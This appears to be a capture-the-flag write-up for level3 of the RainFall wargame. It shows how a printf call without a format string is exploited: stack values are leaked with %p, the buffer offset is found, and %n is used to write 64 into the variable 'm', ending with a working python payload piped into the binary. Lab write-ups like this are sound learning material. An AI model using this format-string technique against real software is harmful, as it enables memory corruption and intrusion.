We start by opening the file in [dogbolt](https://dogbolt.org/). Here we can see that it use a printf without specifying a format

So we can try to play with it by, doing something like:

```
level3@RainFall:~$ ./level3
%p %p %p
0x200 0xb7fd1ac0 0xb7ff37d0
```

We can that using %p result of memory display.

Since with printf we can write on the stack using %n this is a vulnerability.

Now we will see how to write on our variable `m` to enter the if statement.
We know that %n put the length off a string in a given address :

```
printf("abc%n\n",&nb); // nb == 3
```

Ok we know we can write with %n but how can I find a variable with the 64 char needed to match the condition ?
We will use printf to check the stack, I start by putting some "AAAA" at the start of our printf this help us determine where our buffer start.
Then I will use %p to check pointers :

```
./level3
AAAA %p %p %p %p %p %p %p %p %p %p
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
```

We can see that the start of our buffer is 4 pointer or %4$p

Ok I can write a specific value on an address will the address,
so we will get the address of `m` who can be found with `gdb` or `objdump -t`
address : 0804988c
in little endian : \x8c\x98\x04\x08

Ok we have the address and a value time to put the value in the `m`
The injection will look like:
[address of `m` (to set the printf pointer on it)][64 - len(address) = 60][%4$n(start of our buffer)]

```
python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit && cat /tmp/exploit - | ./level3
```
